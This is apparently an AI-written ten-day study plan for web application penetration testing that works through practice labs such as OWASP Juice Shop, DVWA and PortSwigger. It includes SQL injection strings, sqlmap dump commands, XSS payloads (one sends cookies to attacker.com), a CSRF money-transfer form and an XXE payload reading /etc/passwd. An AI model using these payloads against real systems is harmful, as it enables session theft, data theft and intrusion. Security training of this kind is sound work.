10-Day Web Application Penetration Testing Study Plan

Here's a comprehensive roadmap taking you from basics to advanced practical skills, designed for someone with your cybersecurity background.
Daily Structure (4-5 hours/day)

    Theory & Concepts: 1.5 hours

    Hands-on Labs: 2-3 hours

    Practice & Review: 1 hour

Day 1: Foundations & HTTP Protocol
Theory (1.5 hours)

Topics:

    Web application architecture (client-server model, HTTP/HTTPS)

    HTTP methods (GET, POST, PUT, DELETE, PATCH)

    Request/response structure (headers, body, status codes)

    Cookies, sessions, and authentication mechanisms

    ​

Resources:

    MDN Web Docs: HTTP Overview - https://developer.mozilla.org/en-US/docs/Web/HTTP

    PortSwigger Web Security Academy: HTTP basics - https://portswigger.net/web-security/learning-paths

Practical (2-3 hours)

Setup:

    Install Burp Suite Community Edition

    Configure browser proxy (FoxyProxy)

    Set up OWASP Juice Shop locally:

bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop

Exercises:

    Intercept HTTP traffic with Burp Proxy

    Analyze request/response structures

    Modify cookies and headers using Burp Repeater

    Complete Juice Shop challenges: "Score Board" and "Privacy Policy"

    ​

Resources:

    Burp Suite documentation: https://portswigger.net/burp/documentation

    OWASP Juice Shop: https://github.com/juice-shop/juice-shop

Day 2: Information Gathering & Reconnaissance
Theory (1.5 hours)

Topics:

    Passive reconnaissance (OSINT, DNS enumeration, subdomain discovery)

    Active reconnaissance (port scanning, service fingerprinting)

    Technology stack identification

    Mapping attack surface

    ​

Resources:

    OWASP Testing Guide - Information Gathering: https://owasp.org/www-project-web-security-testing-guide/

    HackerSploit YouTube: Web App Recon

Practical (2-3 hours)

Tools:

bash
# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com

# Technology fingerprinting
whatweb target.com
wappalyzer (browser extension)

# Directory/file discovery
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

Exercises:

    Perform reconnaissance on Juice Shop

    Map out the application structure

    Identify technologies used (view source, Wappalyzer)

    Discover hidden endpoints with Gobuster

    Complete Juice Shop: "Exposed Metrics" challenge

    ​

Day 3: OWASP Top 10 - Injection Attacks (SQL Injection)
Theory (1.5 hours)

Topics:

    SQL Injection principles and types (Classic, Blind, Time-based)

    Authentication bypass techniques

    Data extraction methods

    SQLMap automation

    ​

Resources:

    PortSwigger SQL Injection: https://portswigger.net/web-security/sql-injection

    OWASP SQL Injection Guide

    PentesterLab SQL Injection series

Practical (2-3 hours)

Manual Testing:

sql
# Test for SQL injection
' OR '1'='1
admin' --
' OR '1'='1' -- -

# Union-based extraction
' UNION SELECT NULL, NULL--
' UNION SELECT username, password FROM users--

Automated Testing:

bash
# SQLMap
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

Labs:

    PortSwigger SQL Injection Labs (5-6 labs)

    DVWA SQL Injection (Low, Medium, High)

    Juice Shop: "Login Admin" and "User Credentials" challenges

    ​

Resources:

    DVWA: https://github.com/digininja/DVWA

    PortSwigger Labs: https://portswigger.net/web-security/all-labs

Day 4: OWASP Top 10 - Cross-Site Scripting (XSS)
Theory (1.5 hours)

Topics:

    XSS types: Reflected, Stored, DOM-based

    JavaScript payloads and encoding

    XSS exploitation techniques (cookie stealing, keylogging)

    Bypassing filters and WAFs

    ​

Resources:

    PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting

    OWASP XSS Guide

    XSS Game by Google: https://xss-game.appspot.com/

Practical (2-3 hours)

Payloads:

javascript
# Basic XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>

# Cookie stealing
<script>document.location='http://attacker.com/?c='+document.cookie</script>

# Filter bypass
<scr<script>ipt>alert(1)</scr</script>ipt>
<svg/onload=alert(1)>

Labs:

    PortSwigger XSS Labs (8-10 labs)

    DVWA XSS (Reflected, Stored)

    Juice Shop: "DOM XSS", "Reflected XSS", "Bonus Payload" challenges

    ​

    XSS Game levels 1-6

Resources:

    XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Day 5: Authentication & Session Management Flaws
Theory (1.5 hours)

Topics:

    Authentication bypass techniques

    Session fixation and hijacking

    Password reset vulnerabilities

    JWT token attacks

    Multi-factor authentication bypass

    ​

Resources:

    PortSwigger Authentication: https://portswigger.net/web-security/authentication

    OWASP Authentication Cheat Sheet

    JWT.io: Understanding JSON Web Tokens

Practical (2-3 hours)

Testing Techniques:

bash
# Session analysis with Burp Sequencer
# Cookie manipulation
# JWT decoding and tampering
jwt_tool token.jwt -T

# Password reset token analysis
# OTP bypass attempts

Labs:

    PortSwigger Authentication Labs (10-12 labs including 2FA bypass)

    Practice OTP bypass from your earlier mainframe testing experience

    Juice Shop: "Login Bender", "Reset Bjoern's Password", "Login Jim"

    ​

Resources:

    JWT_Tool: https://github.com/ticarpi/jwt_tool

Day 6: OWASP Top 10 - IDOR & Access Control
Theory (1.5 hours)

Topics:

    Insecure Direct Object References (IDOR)

    Horizontal and vertical privilege escalation

    Broken access control patterns

    Testing methodology

    ​

Resources:

    PortSwigger Access Control: https://portswigger.net/web-security/access-control

    OWASP Broken Access Control

Practical (2-3 hours)

Testing Approach:

text
1. Map all endpoints and parameters
2. Test with different user roles
3. Modify IDs, UUIDs, tokens
4. Test for horizontal/vertical escalation

Labs:

    PortSwigger Access Control Labs (10+ labs)

    DVWA Insecure CAPTCHA

    Juice Shop: "View Basket", "Forged Coupon", "Manipulate Basket"

    ​

Day 7: CSRF, SSRF & XXE
Theory (1.5 hours)

Topics:

    Cross-Site Request Forgery (CSRF) attacks

    Server-Side Request Forgery (SSRF)

    XML External Entity (XXE) injection

    File upload vulnerabilities

    ​

Resources:

    PortSwigger CSRF, SSRF, XXE modules

    OWASP guides for each vulnerability type

Practical (2-3 hours)

CSRF PoC:

xml
<form action="https://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>

XXE Payload:

xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

Labs:

    PortSwigger CSRF, SSRF, XXE Labs

    DVWA CSRF, File Upload

    Juice Shop: "CSRF", "XXE Data Access"

    ​

Day 8: API Security Testing
Theory (1.5 hours)

Topics:

    REST API structure and authentication

    API enumeration and testing

    GraphQL injection

    API rate limiting and abuse

    OWASP API Security Top 10

    ​

Resources:

    OWASP API Security Top 10: https://owasp.org/API-Security/

    PortSwigger API Testing

    REST API Pentesting Guide

Practical (2-3 hours)

Setup:

bash
# Install VAmPI (Vulnerable API)
docker run -p 5000:5000 erev0s/vampi

Testing:

bash
# API enumeration
curl -X GET http://target.com/api/users
curl -X POST http://target.com/api/login -d '{"user":"admin","pass":"admin"}'

# Burp Intruder for API fuzzing
# Test authentication endpoints
# Enumerate object IDs

Labs:

    VAmPI challenges

    ​

    PortSwigger API Labs

    Juice Shop API-related challenges

Resources:

    VAmPI: https://github.com/erev0s/VAmPI

    Postman for API testing

Day 9: Advanced Topics & Tool Mastery
Theory (1.5 hours)

Topics:

    Deserialization attacks

    Race conditions

    Business logic flaws

    WebSockets security

    Advanced Burp Suite features (Macros, Extensions)

    ​

Resources:

    PortSwigger Advanced Topics

    Burp Suite Extensions: Logger++, Autorize, Active Scan++

Practical (2-3 hours)

Burp Extensions:

text
Install via BApp Store:
- Autorize (for access control testing)
- Logger++ (advanced logging)
- Param Miner (for parameter discovery)
- Turbo Intruder (for race conditions)

Advanced Labs:

    PortSwigger Insecure Deserialization Labs

    Race Condition Labs

    Business Logic Vulnerability Labs

    Web Goat advanced modules

    ​

Resources:

    Web Goat: https://github.com/WebGoat/WebGoat

Day 10: Methodology, Reporting & CTF Practice
Theory (1.5 hours)

Topics:

    Complete penetration testing methodology

    ​

    Report writing and vulnerability classification (CVSS)

    Remediation recommendations

    Bug bounty best practices

Resources:

    OWASP WSTG (Web Security Testing Guide): https://owasp.org/www-project-web-security-testing-guide/

    Bug Bounty Bootcamp book

    Sample penetration testing reports

Practical (2-3 hours)

Full Assessment:

    Complete a full pentest on OWASP Mutillidae II

    ​

    Document all findings

    Write a professional report

CTF Practice:

    Try HackTheBox web challenges (5-6 easy boxes)

    PentesterLab exercises

    Finish remaining Juice Shop challenges

Resources:

    OWASP Mutillidae II: https://github.com/webpwnized/mutillidae

    HackTheBox: https://www.hackthebox.com/

    PentesterLab: https://pentesterlab.com/

Essential Tools Setup (Day 0 or throughout)
Required Tools:

bash
# Core tools
- Burp Suite Community/Professional
- OWASP ZAP (alternative)[web:199][web:204]
- Firefox/Chrome with extensions (FoxyProxy, Wappalyzer, Cookie Editor)

# Reconnaissance
- subfinder, amass, gobuster, ffuf, nikto

# Testing
- sqlmap, jwt_tool, nuclei, wpscan

# Docker containers
- OWASP Juice Shop[web:203]
- DVWA[web:203]
- VAmPI[web:203]
- Mutillidae II[web:203]
- WebGoat[web:203]

Installation Script:

bash
# Install vulnerable apps
docker pull bkimminich/juice-shop
docker pull vulnerables/web-dvwa
docker pull erev0s/vampi
docker pull webpwnized/mutillidae

Supplementary Resources
Video Channels:

    Rana Khalil (PortSwigger Labs walkthroughs)

    LiveOverflow

    PwnFunction

    HackerSploit

Books:

    "The Web Application Hacker's Handbook" (classic)

    "Bug Bounty Bootcamp" by Vickie Li

    "Real-World Bug Hunting" by Peter Yaworski

Practice Platforms:

    PortSwigger Web Security Academy (free)

    ​

    PentesterLab (paid/free tiers)

    HackTheBox (web challenges)

    TryHackMe (web application rooms)

Certifications (Post-study):

    BSCP (Burp Suite Certified Practitioner)

    eWPT (eLearnSecurity Web Penetration Tester)

    OSWE (Offensive Security Web Expert)


Daily Progress Tracker

Create a checklist:

text
Day 1: ☐ HTTP basics ☐ Burp setup ☐ 5 Juice Shop challenges
Day 2: ☐ Recon tools ☐ Subdomain enum ☐ Directory brute-force
Day 3: ☐ SQL theory ☐ 5 SQLi labs ☐ SQLMap practice
Day 4: ☐ XSS types ☐ 8 XSS labs ☐ Cookie stealing
Day 5: ☐ Auth bypass ☐ 10 auth labs ☐ JWT attacks
Day 6: ☐ IDOR ☐ 10 access control labs
Day 7: ☐ CSRF/SSRF/XXE ☐ 6 labs each
Day 8: ☐ API Top 10 ☐ VAmPI ☐ API fuzzing
Day 9: ☐ Advanced topics ☐ Burp extensions ☐ Race conditions
Day 10: ☐ Full assessment ☐ Report ☐ CTF practice

This roadmap provides a structured path from fundamentals to advanced practical skills, emphasizing hands-on learning with vulnerable applications while building a strong theoretical foundation
